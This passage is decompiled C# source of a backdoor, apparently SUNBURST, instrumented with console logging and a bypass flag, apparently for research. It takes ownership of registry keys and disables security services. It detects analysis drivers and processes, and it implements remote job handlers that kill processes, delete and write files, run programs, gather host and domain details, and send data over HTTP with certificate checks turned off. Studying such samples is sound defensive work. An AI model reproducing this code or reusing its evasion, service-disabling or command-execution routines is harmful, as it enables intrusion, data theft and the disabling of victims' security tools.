					flag = Program.NativeMethods.SetProcessPrivilege(privilege2, true, out newState);
					flag2 = Program.NativeMethods.SetProcessPrivilege(privilege, true, out newState2);
					try
					{
						Program.RegistryHelper.SetKeyOwner(key, subKey, owner);
					}
					finally
					{
						if (flag)
						{
							Program.NativeMethods.SetProcessPrivilege(privilege2, newState, out newState);
						}
						if (flag2)
						{
							Program.NativeMethods.SetProcessPrivilege(privilege, newState2, out newState2);
						}
					}
				}
			}

			// Token: 0x0600096E RID: 2414 RVA: 0x000430B8 File Offset: 0x000412B8
			public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
			{
				bool isProtected = !reset;
				// SYSTEM
				string text = Program.ZipHelper.Unzip("C44MDnH1BQA=");
				string text2 = reset ? text : Program.RegistryHelper.GetNewOwnerName();
				Program.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text);
				using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
				{
					RegistrySecurity registrySecurity = new RegistrySecurity();
					if (!reset)
					{
						RegistryAccessRule rule = new RegistryAccessRule(text2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
						registrySecurity.AddAccessRule(rule);
					}
					registrySecurity.SetAccessRuleProtection(isProtected, false);
					registryKey.SetAccessControl(registrySecurity);
				}
				if (!reset)
				{
					Program.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text2);
				}
			}
		}

		// Token: 0x020000D0 RID: 208
		private static class ConfigManager
		{
			// Token: 0x0600096F RID: 2415 RVA: 0x00043154 File Offset: 0x00041354
			public static bool ReadReportStatus(out Program.ReportStatus status)
			{
				try
				{
					string s;
					int num;
					if (Program.ConfigManager.ReadConfig(Program.reportStatusName, out s) && int.TryParse(s, out num))
					{
						switch (num)
						{
							case 3:
								status = Program.ReportStatus.Truncate;
								return true;
							case 4:
								status = Program.ReportStatus.New;
								return true;
							case 5:
								status = Program.ReportStatus.Append;
								return true;
						}
					}
				}
				catch (ConfigurationErrorsException)
				{
				}
				status = Program.ReportStatus.New;
				return false;
			}

			// Token: 0x06000970 RID: 2416 RVA: 0x000431C0 File Offset: 0x000413C0
			public static bool ReadServiceStatus(bool _readonly)
			{
				try
				{
					string s;
					int num;
					if (Program.ConfigManager.ReadConfig(Program.serviceStatusName, out s) && int.TryParse(s, out num) && num >= 250 && num % 5 == 0 && num <= 250 + ((1 << Program.svcList.Length) - 1) * 5)
					{
						num = (num - 250) / 5;
						if (!_readonly)
						{
							for (int i = 0; i < Program.svcList.Length; i++)
							{
								Program.svcList[i].stopped = ((num & 1 << i) != 0);
							}
						}
						return true;
					}
				}
				catch (Exception)
				{
				}
				if (!_readonly)
				{
					for (int j = 0; j < Program.svcList.Length; j++)
					{
						Program.svcList[j].stopped = true;
					}
				}
				return false;
			}

			// Token: 0x06000971 RID: 2417 RVA: 0x00043284 File Offset: 0x00041484
			public static bool WriteReportStatus(Program.ReportStatus status)
			{
				Program.ReportStatus reportStatus;
				if (Program.ConfigManager.ReadReportStatus(out reportStatus))
				{
					switch (status)
					{
						// 4
						case Program.ReportStatus.New:
							return Program.ConfigManager.WriteConfig(Program.reportStatusName, Program.ZipHelper.Unzip("MwEA"));
						// 5
						case Program.ReportStatus.Append:
							return Program.ConfigManager.WriteConfig(Program.reportStatusName, Program.ZipHelper.Unzip("MwUA"));
						// 3
						case Program.ReportStatus.Truncate:
							return Program.ConfigManager.WriteConfig(Program.reportStatusName, Program.ZipHelper.Unzip("MwYA"));
					}
				}
				return false;
			}

			// Token: 0x06000972 RID: 2418 RVA: 0x000432F0 File Offset: 0x000414F0
			public static bool WriteServiceStatus()
			{
				if (Program.ConfigManager.ReadServiceStatus(true))
				{
					int num = 0;
					for (int i = 0; i < Program.svcList.Length; i++)
					{
						num |= (Program.svcList[i].stopped ? 1 : 0) << i;
					}
					return Program.ConfigManager.WriteConfig(Program.serviceStatusName, (num * 5 + 250).ToString());
				}
				return false;
			}

			// Token: 0x06000973 RID: 2419 RVA: 0x00043350 File Offset: 0x00041550
			private static bool ReadConfig(string key, out string sValue)
			{
				sValue = null;
				try
				{
					sValue = ConfigurationManager.AppSettings[key];
					return true;
				}
				catch (Exception)
				{
				}
				return false;
			}

			// Token: 0x06000974 RID: 2420 RVA: 0x00043388 File Offset: 0x00041588
			private static bool WriteConfig(string key, string sValue)
			{
				try
				{
					Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
					KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
					if (settings[key] != null)
					{
						settings[key].Value = sValue;
						configuration.Save(ConfigurationSaveMode.Modified);
						ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
						return true;
					}
				}
				catch (Exception)
				{
				}
				return false;
			}
		}

		// Token: 0x020000D1 RID: 209
		private class ServiceConfiguration
		{
			// Token: 0x1700012E RID: 302
			// (get) Token: 0x06000975 RID: 2421 RVA: 0x000433F8 File Offset: 0x000415F8
			// (set) Token: 0x06000976 RID: 2422 RVA: 0x0004343C File Offset: 0x0004163C
			public bool stopped
			{
				get
				{
					object @lock = this._lock;
					bool stopped;
					lock (@lock)
					{
						stopped = this._stopped;
					}
					return stopped;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._stopped = value;
					}
				}
			}

			// Token: 0x1700012F RID: 303
			// (get) Token: 0x06000977 RID: 2423 RVA: 0x00043480 File Offset: 0x00041680
			// (set) Token: 0x06000978 RID: 2424 RVA: 0x000434C4 File Offset: 0x000416C4
			public bool running
			{
				get
				{
					object @lock = this._lock;
					bool running;
					lock (@lock)
					{
						running = this._running;
					}
					return running;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._running = value;
					}
				}
			}

			// Token: 0x17000130 RID: 304
			// (get) Token: 0x06000979 RID: 2425 RVA: 0x00043508 File Offset: 0x00041708
			// (set) Token: 0x0600097A RID: 2426 RVA: 0x0004354C File Offset: 0x0004174C
			public bool disabled
			{
				get
				{
					object @lock = this._lock;
					bool disabled;
					lock (@lock)
					{
						disabled = this._disabled;
					}
					return disabled;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._disabled = value;
					}
				}
			}

			// Token: 0x040002E9 RID: 745
			public ulong[] timeStamps;

			// Token: 0x040002EA RID: 746
			private readonly object _lock = new object();

			// Token: 0x040002EB RID: 747
			private volatile bool _stopped;

			// Token: 0x040002EC RID: 748
			private volatile bool _running;

			// Token: 0x040002ED RID: 749
			private volatile bool _disabled;

			// Token: 0x040002EE RID: 750
			public Program.ServiceConfiguration.Service[] Svc;

			// Token: 0x020001C0 RID: 448
			public class Service
			{
				// Token: 0x0400059E RID: 1438
				public ulong timeStamp;

				// Token: 0x0400059F RID: 1439
				public uint DefaultValue;

				// Token: 0x040005A0 RID: 1440
				public bool started;
			}
		}

		// Token: 0x020000D2 RID: 210
		private static class ProcessTracker
		{
			// Token: 0x0600097C RID: 2428 RVA: 0x000435A4 File Offset: 0x000417A4
			private static bool SearchConfigurations()
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Entering SearchConfigurations()");
				// Select * From Win32_SystemDriver
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Search Configurations: "+ Program.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA=="));
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Program.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==")))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						// PathName
						ulong hash = Program.GetHash(Path.GetFileName(((ManagementObject)managementBaseObject).Properties[Program.ZipHelper.Unzip("C0gsyfBLzE0FAA==")].Value.ToString()).ToLower());

						if (!Program.printy)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Checking property: " + Program.ZipHelper.Unzip("C0gsyfBLzE0FAA==") + "  GetFileName: " + Path.GetFileName(((ManagementObject)managementBaseObject).Properties[Program.ZipHelper.Unzip("C0gsyfBLzE0FAA==")].Value.ToString()));
						}
						if ((Array.IndexOf<ulong>(Program.configTimeStamps, hash) != -1))
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check for special drivers failed . Backdoor ConfigTimeStamps detected last GetFileName with hash " + hash + " [Use -r to Bypass]" );
							if (Program.bypassr)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Because you are bypassing drivers/process check, the backdoor will continue. In a normal case teh backdoor stop execution. ");
							}
							else
							{
								return true;
							}
						}
					}
				}
				return false;
			}

			// Token: 0x0600097D RID: 2429 RVA: 0x00043658 File Offset: 0x00041858
			private static bool SearchAssemblies(Process[] processes)
			{
				for (int i = 0; i < processes.Length; i++)
				{
					ulong hash = Program.GetHash(processes[i].ProcessName.ToLower());

					if (!Program.printp)
					{
						Console.WriteLine("         - Assembly/Process: " + processes[i].ProcessName);
					}
					if (Array.IndexOf<ulong>(Program.assemblyTimeStamps, hash) != -1)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Interesting assembly found:" + processes[i].ProcessName + "[-r to Bypass]");
						if (Program.bypassr)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Because you are bypassing drivers/process check, the backdoor will continue. In a normal case teh backdoor stop execution. ");
						}
						else
						{
							return true;
						}
					}
				}
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Searching processes completed.");
				return false;
			}

			// Token: 0x0600097E RID: 2430 RVA: 0x00043698 File Offset: 0x00041898
			private static bool SearchServices(Process[] processes)
			{
				for (int i = 0; i < processes.Length; i++)
				{
					ulong hash = Program.GetHash(processes[i].ProcessName.ToLower());

					if (!Program.printi)
					{
						Console.WriteLine("         - Searching Services: " + processes[i].ProcessName);
					}
					foreach (Program.ServiceConfiguration serviceConfiguration in Program.svcList)
					{
						if (Array.IndexOf<ulong>(serviceConfiguration.timeStamps, hash) != -1)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Interesting process found:" + processes[i].ProcessName.ToLower());
							object @lock = Program.ProcessTracker._lock;
							lock (@lock)
							{
								if (!serviceConfiguration.running)
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Service appears not to be running");
									Program.svcListModified1 = true;
									Program.svcListModified2 = true;
									serviceConfiguration.running = true;
								}
								if (!serviceConfiguration.disabled && !serviceConfiguration.stopped && serviceConfiguration.Svc.Length != 0)
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Setting service to manual then disable and stop it.");
									Program.DelayMin(0, 0);
									Program.ProcessTracker.SetManualMode(serviceConfiguration.Svc);
									serviceConfiguration.disabled = true;
									serviceConfiguration.stopped = true;
								}
							}
						}
					}
				}
				if (Program.svcList.Any((Program.ServiceConfiguration a) => a.disabled))
				{
					Program.ConfigManager.WriteServiceStatus();
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Write service status.");
					return true;
				}
				
				return false;
			}

			// Token: 0x0600097F RID: 2431 RVA: 0x000437C0 File Offset: 0x000419C0
			public static bool TrackProcesses(bool full)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ready to start getting system processes");
				Process[] processes = Process.GetProcesses();
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - List of processes obtained");
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ready to start searching processes");
				if (Program.ProcessTracker.SearchAssemblies(processes))
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - SearchAssemblies in TrackProcesses() returning true");
					return true;
				}
                Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ready to start searching Services");
				bool flag = Program.ProcessTracker.SearchServices(processes);
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Services search completed");
				if ((!flag && full) || Program.forceu)
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Searching configurations");
					return Program.ProcessTracker.SearchConfigurations();
				}
				return flag;
			}

			// Token: 0x06000980 RID: 2432 RVA: 0x000437F4 File Offset: 0x000419F4
			private static bool SetManualMode(Program.ServiceConfiguration.Service[] svcList)
			{
				try
				{
					
					// SYSTEM\CurrentControlSet\services
					bool result = false;
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Program.ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
					{
						foreach (string text in registryKey.GetSubKeyNames())
						{
							foreach (Program.ServiceConfiguration.Service service in svcList)
							{
								try
								{
									if (Program.GetHash(text.ToLower()) == service.timeStamp)
									{
										Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Interesting Service found " + text);
										if (service.started)
										{
											Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Service is started " + text + " setting " + registryKey + "to false");
											result = true;
											Program.RegistryHelper.SetKeyPermissions(registryKey, text, false);
										}
										else
										{
											using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
											{
												// Start
												if (registryKey2.GetValueNames().Contains(Program.ZipHelper.Unzip("Cy5JLCoBAA==")))
												{
													Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Setting "+text+" with value " + Program.ZipHelper.Unzip("Cy5JLCoBAA=="));
													// Cy5JLCoBAA==
													registryKey2.SetValue(Program.ZipHelper.Unzip("Cy5JLCoBAA=="), 4, RegistryValueKind.DWord);
													result = true;
												}
											}
										}
									}
								}
								catch (Exception)
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Error in SetManualMode");
								}
							}
						}
					}
					return result;
				}
				catch (Exception)
				{
				}
				return false;
			}

			// Token: 0x06000981 RID: 2433 RVA: 0x00043924 File Offset: 0x00041B24
			public static void SetAutomaticMode()
			{
				try
				{
					// SYSTEM\CurrentControlSet\services
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Program.ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
					{
						foreach (string text in registryKey.GetSubKeyNames())
						{
							foreach (Program.ServiceConfiguration serviceConfiguration in Program.svcList)
							{
								if (serviceConfiguration.stopped)
								{
									foreach (Program.ServiceConfiguration.Service service in serviceConfiguration.Svc)
									{
										try
										{
											if (Program.GetHash(text.ToLower()) == service.timeStamp)
											{
												if (service.started)
												{
													Program.RegistryHelper.SetKeyPermissions(registryKey, text, true);
												}
												else
												{
													using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
													{
														// Start
														if (registryKey2.GetValueNames().Contains(Program.ZipHelper.Unzip("Cy5JLCoBAA==")))
														{
															// Start
															registryKey2.SetValue(Program.ZipHelper.Unzip("Cy5JLCoBAA=="), service.DefaultValue, RegistryValueKind.DWord);
														}
													}
												}
											}
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x040002EF RID: 751
			private static readonly object _lock = new object();
		}

		// Token: 0x020000D3 RID: 211
		private static class Job
		{
			// Token: 0x06000983 RID: 2435 RVA: 0x00043ABC File Offset: 0x00041CBC
			public static int GetArgumentIndex(string cl, int num)
			{
				if (cl == null)
				{
					return -1;
				}
				if (num == 0)
				{
					return 0;
				}
				char[] array = cl.ToCharArray();
				bool flag = false;
				int num2 = 0;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] == '"')
					{
						flag = !flag;
					}
					if (!flag && array[i] == ' ' && i > 0 && array[i - 1] != ' ')
					{
						num2++;
						if (num2 == num)
						{
							return i + 1;
						}
					}
				}
				return -1;
			}

			// Token: 0x06000984 RID: 2436 RVA: 0x00043B1C File Offset: 0x00041D1C
			public static string[] SplitString(string cl)
			{
				if (cl == null)
				{
					return new string[0];
				}
				char[] array = cl.Trim().ToCharArray();
				bool flag = false;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] == '"')
					{
						flag = !flag;
					}
					if (!flag && array[i] == ' ')
					{
						array[i] = '\n';
					}
				}
				string[] array2 = new string(array).Split(new char[]
				{
					'\n'
				}, StringSplitOptions.RemoveEmptyEntries);
				for (int j = 0; j < array2.Length; j++)
				{
					string text = "";
					bool flag2 = false;
					array2[j] = Program.Unquote(array2[j]);
					foreach (char c in array2[j])
					{
						if (flag2)
						{
							if (c != '`')
							{
								if (c == 'q')
								{
									text += "\"";
								}
								else
								{
									text = text + '`'.ToString() + c.ToString();
								}
							}
							else
							{
								text += '`'.ToString();
							}
							flag2 = false;
						}
						else if (c == '`')
						{
							flag2 = true;
						}
						else
						{
							text += c.ToString();
						}
					}
					if (flag2)
					{
						text += '`'.ToString();
					}
					array2[j] = text;
				}
				return array2;
			}

			// Token: 0x06000985 RID: 2437 RVA: 0x00043C6E File Offset: 0x00041E6E
			public static void SetTime(string[] args, out int delay)
			{
				delay = int.Parse(args[0]);
			}

			// Token: 0x06000986 RID: 2438 RVA: 0x00043C7A File Offset: 0x00041E7A
			public static void KillTask(string[] args)
			{
				Process.GetProcessById(int.Parse(args[0])).Kill();
			}

			// Token: 0x06000987 RID: 2439 RVA: 0x00043C8E File Offset: 0x00041E8E
			public static void DeleteFile(string[] args)
			{
				File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
			}

			// Token: 0x06000988 RID: 2440 RVA: 0x00043CA0 File Offset: 0x00041EA0
			public static int GetFileHash(string[] args, out string result)
			{
				result = null;
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				using (MD5 md = MD5.Create())
				{
					using (FileStream fileStream = File.OpenRead(path))
					{
						byte[] bytes = md.ComputeHash(fileStream);
						if (args.Length > 1)
						{
							return (!(Program.ByteArrayToHexString(bytes).ToLower() == args[1].ToLower())) ? 1 : 0;
						}
						result = Program.ByteArrayToHexString(bytes);
					}
				}
				return 0;
			}

			// Token: 0x06000989 RID: 2441 RVA: 0x00043D34 File Offset: 0x00041F34
			public static void GetFileSystemEntries(string[] args, out string result)
			{
				string searchPattern = (args.Length >= 2) ? args[1] : "*";
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				string[] value = (from f in Directory.GetFiles(path, searchPattern)
								  select Path.GetFileName(f)).ToArray<string>();
				string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
								   select Path.GetFileName(f)).ToArray<string>();
				result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
			}

			// Token: 0x0600098A RID: 2442 RVA: 0x00043DE0 File Offset: 0x00041FE0
			public static void GetProcessByDescription(string[] args, out string result)
			{
				result = null;
				if (args.Length == 0)
				{
					foreach (Process process in Process.GetProcesses())
					{
						// [{0,5}] {1}
						result += string.Format(Program.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, Program.Quote(process.ProcessName));
					}
					return;
				}
				// Select * From Win32_Process
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Program.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						string[] array = new string[]
						{
							string.Empty,
							string.Empty
						};
						ManagementObject managementObject2 = managementObject;
						// GetOwner
						string methodName = Program.ZipHelper.Unzip("c08t8S/PSy0CAA==");
						object[] array2 = array;
						object[] args2 = array2;
						// [{0,5}] {1,-16} {2}	{3,5} {4}\{5}
						Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
						result += string.Format(Program.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
						{
							// ProcessID
							// Name
							// ParentProcessID
							managementObject[Program.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
							Program.Quote(managementObject[Program.ZipHelper.Unzip("80vMTQUA")].ToString()),
							managementObject[args[0]],
							managementObject[Program.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
							array[1],
							array[0]
						});
					}
				}
			}

			// Token: 0x0600098B RID: 2443 RVA: 0x00043F68 File Offset: 0x00042168
			private static string GetDescriptionId(ref int i)
			{
				i++;
				return "\n" + i.ToString() + ". ";
			}

			// Token: 0x0600098C RID: 2444 RVA: 0x00043F88 File Offset: 0x00042188
			public static void CollectSystemDescription(string info, out string result)
			{
				result = null;
				int num = 0;
				string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
				result = result + Program.Job.GetDescriptionId(ref num) + domainName;
				try
				{
					// Administrator
					string str = ((SecurityIdentifier)new NTAccount(domainName, Program.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
					result = result + Program.Job.GetDescriptionId(ref num) + str;
				}
				catch
				{
					result += Program.Job.GetDescriptionId(ref num);
				}
				result = result + Program.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
				result = result + Program.Job.GetDescriptionId(ref num) + Environment.UserName;
				result = result + Program.Job.GetDescriptionId(ref num) + Program.GetOSVersion(true);
				result = result + Program.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
				result = result + Program.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
				result = result + Program.Job.GetDescriptionId(ref num) + info + "\n";
				result += Program.GetNetworkAdapterConfiguration();
			}

			// Token: 0x0600098D RID: 2445 RVA: 0x000440C4 File Offset: 0x000422C4
			public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
			{
				result = null;
				string requestUriString = args[0];
				string s = args[1];
				string text = (args.Length >= 3) ? args[2] : null;
				string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
				{
					"\r\n",
					"\r",
					"\n"
				}, StringSplitOptions.None);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
				httpWebRequest.Proxy = proxy;
				httpWebRequest.Timeout = 120000;
				httpWebRequest.Method = array[0].Split(new char[]
				{
					' '
				})[0];
				foreach (string text2 in array)
				{
					int num = text2.IndexOf(':');
					if (num > 0)
					{
						string text3 = text2.Substring(0, num);
						string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
						if (!WebHeaderCollection.IsRestricted(text3))
						{
							httpWebRequest.Headers.Add(text2);
						}
						else
						{
							ulong hash = Program.GetHash(text3.ToLower());
							// expect
							if (hash <= 8873858923435176895UL)
							{
								// content-type
								if (hash <= 6116246686670134098UL)
								{
									// accept
									if (hash != 2734787258623754862UL)
									{
										// content-type
										if (hash == 6116246686670134098UL)
										{
											httpWebRequest.ContentType = text4;
										}
									}
									else
									{
										httpWebRequest.Accept = text4;
									}
								}
								// user-agent
								else if (hash != 7574774749059321801UL)
								{
									// expect
									if (hash == 8873858923435176895UL)
									{
										// 100-continue
										if (Program.GetHash(text4.ToLower()) == 1475579823244607677UL)
										{
											httpWebRequest.ServicePoint.Expect100Continue = true;
										}
										else
										{
											httpWebRequest.Expect = text4;
										}
									}
								}
								else
								{
									httpWebRequest.UserAgent = text4;
								}
							}
							// connection
							else if (hash <= 11266044540366291518UL)
							{
								// referer
								if (hash != 9007106680104765185UL)
								{
									// connection
									if (hash == 11266044540366291518UL)
									{
										ulong hash2 = Program.GetHash(text4.ToLower());
										// keep-alive
										httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
										// close
										httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
									}
								}
								else
								{
									httpWebRequest.Referer = text4;
								}
							}
							// if-modified-since
							else if (hash != 15514036435533858158UL)
							{
								// date
								if (hash == 16066522799090129502UL)
								{
									httpWebRequest.Date = DateTime.Parse(text4);
								}
							}
							else
							{
								httpWebRequest.Date = DateTime.Parse(text4);
							}
						}
					}
				}
				// {0} {1} HTTP/{2}

				result += string.Format(Program.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
				result = result + httpWebRequest.Headers.ToString() + "\n\n";
				if (!string.IsNullOrEmpty(text))
				{
					using (Stream requestStream = httpWebRequest.GetRequestStream())
					{
						byte[] array3 = Convert.FromBase64String(text);
						requestStream.Write(array3, 0, array3.Length);
					}
				}
				using (WebResponse response = httpWebRequest.GetResponse())
				{
					result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
					result = result + response.Headers.ToString() + "\n";
					using (Stream responseStream = response.GetResponseStream())
					{
						result += new StreamReader(responseStream).ReadToEnd();
					}
				}
			}

			// Token: 0x0600098E RID: 2446 RVA: 0x000444D0 File Offset: 0x000426D0
			public static int RunTask(string[] args, string cl, out string result)
			{
				result = null;
				string fileName = Environment.ExpandEnvironmentVariables(args[0]);
				string arguments = (args.Length > 1) ? cl.Substring(Program.Job.GetArgumentIndex(cl, 1)).Trim() : null;
				using (Process process = new Process())
				{
					process.StartInfo = new ProcessStartInfo(fileName, arguments)
					{
						CreateNoWindow = false,
						UseShellExecute = false
					};
					if (process.Start())
					{
						result = process.Id.ToString();
						return 0;
					}
				}
				return 1;
			}

			// Token: 0x0600098F RID: 2447 RVA: 0x00044564 File Offset: 0x00042764
			public static void WriteFile(string[] args)
			{
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				byte[] array = Convert.FromBase64String(args[1]);
				for (int i = 0; i < 3; i++)
				{
					try
					{
						using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
						{
							fileStream.Write(array, 0, array.Length);
						}
						break;
					}
					catch (Exception)
					{
						if (i + 1 >= 3)
						{
							throw;
						}
					}
					Program.DelayMs(0.0, 0.0);
				}
			}

			// Token: 0x06000990 RID: 2448 RVA: 0x000445F0 File Offset: 0x000427F0
			public static void FileExists(string[] args, out string result)
			{
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				result = File.Exists(path).ToString();
			}

			// Token: 0x06000991 RID: 2449 RVA: 0x00044616 File Offset: 0x00042816
			public static int ReadRegistryValue(string[] args, out string result)
			{
				result = Program.RegistryHelper.GetValue(args[0], args[1], null);
				if (result != null)
				{
					return 0;
				}
				return 1;
			}

			// Token: 0x06000992 RID: 2450 RVA: 0x0004462D File Offset: 0x0004282D
			public static void DeleteRegistryValue(string[] args)
			{
				Program.RegistryHelper.DeleteValue(args[0], args[1]);
			}

			// Token: 0x06000993 RID: 2451 RVA: 0x0004463A File Offset: 0x0004283A
			public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
			{
				result = Program.RegistryHelper.GetSubKeyAndValueNames(args[0]);
			}

			// Token: 0x06000994 RID: 2452 RVA: 0x00044648 File Offset: 0x00042848
			public static int SetRegistryValue(string[] args)
			{
				RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
				string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
				if (!Program.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
				{
					return 1;
				}
				return 0;
			}
		}

		// Token: 0x020000D4 RID: 212
		private class Proxy
		{
			// Token: 0x06000995 RID: 2453 RVA: 0x000446A0 File Offset: 0x000428A0
			public Proxy(Program.ProxyType proxyType)
			{
				try
				{
					this.proxyType = proxyType;
					Program.ProxyType proxyType2 = this.proxyType;
					if (proxyType2 != Program.ProxyType.System)
					{
						if (proxyType2 == Program.ProxyType.Direct)
						{
							this.proxy = null;
						}
						else
						{
							Console.WriteLine("Proxy is AsWebProxy()");
							//this.proxy = HttpProxySettings.Instance.AsWebProxy();
							//added this line this.proxy = null so it could compile
							this.proxy = null;
						}
					}
					else
					{
						this.proxy = WebRequest.GetSystemWebProxy();
					}
				}
				catch
				{
				}
			}

			// Token: 0x06000996 RID: 2454 RVA: 0x00044704 File Offset: 0x00042904
			public override string ToString()
			{
				if (this.proxyType != Program.ProxyType.Manual)
				{
					return this.proxyType.ToString();
				}
				if (this.proxy == null)
				{
					return Program.ProxyType.Direct.ToString();
				}
				if (string.IsNullOrEmpty(this.proxyString))
				{
					try
					{
						Console.WriteLine("Checking Proxy Settings() if its disabled (direct), Used defaultmproxy,manual. Set to DIRECT ");

						//Setting this as direct so it can compile
						this.proxyString = Program.ProxyType.Direct.ToString();

						/*IHttpProxySettings instance = HttpProxySettings.Instance;
						if (instance.IsDisabled)
						{
							this.proxyString = Program.ProxyType.Direct.ToString();
						}
						else if (instance.UseSystemDefaultProxy)
						{
							this.proxyString = ((WebRequest.DefaultWebProxy != null) ? Program.ProxyType.Default.ToString() : Program.ProxyType.System.ToString());
						}
						else
						{
							this.proxyString = Program.ProxyType.Manual.ToString();
							if (instance.IsValid)
							{
								string[] array = new string[7];
